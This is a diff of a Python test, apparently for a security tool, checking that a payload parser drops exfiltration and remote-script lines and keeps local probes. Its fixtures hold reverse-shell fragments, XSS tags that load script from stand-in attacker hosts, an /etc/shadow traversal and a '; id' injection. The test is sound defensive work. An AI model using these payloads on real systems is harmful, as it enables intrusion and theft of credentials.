@@ -72,15 +72,20 @@ def test_parse_payload_lines_filters_exfiltration_callbacks_always():
             "; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i",  # 名前付きパイプ shell
             'echo "use Socket;socket(S,PF_INET,SOCK_STREAM,...)"',  # perl reverse shell
             "<svg onload=document.body.appendChild(document.createElement('script')).src='//evil/x'>",
+            "<script src=//brutelogic.com.br/1.js>",  # 外部スクリプト読込
+            '"><script src="https://evil.example/x.js"></script>',  # 外部スクリプト(絶対URL)
             "../../../../etc/shadow",          # ローカル読取プローブ → 保持
             "; id",                            # 通常の検出プローブ → 保持
+            "<img src=x onerror=alert(1)>",    # 相対src(外部読込でない) → 保持
         ]
     )
     for allow in (False, True):
         result = parse_payload_lines(text, allow_destructive=allow)
-        assert result == ["../../../../etc/shadow", "; id"], (
-            f"exfiltration not filtered (allow_destructive={allow}): {result}"
-        )
+        assert result == [
+            "../../../../etc/shadow",
+            "; id",
+            "<img src=x onerror=alert(1)>",
+        ], f"exfiltration not filtered (allow_destructive={allow}): {result}"
 
 
 def test_build_corpus_uses_fetch_text_monkeypatch(monkeypatch):
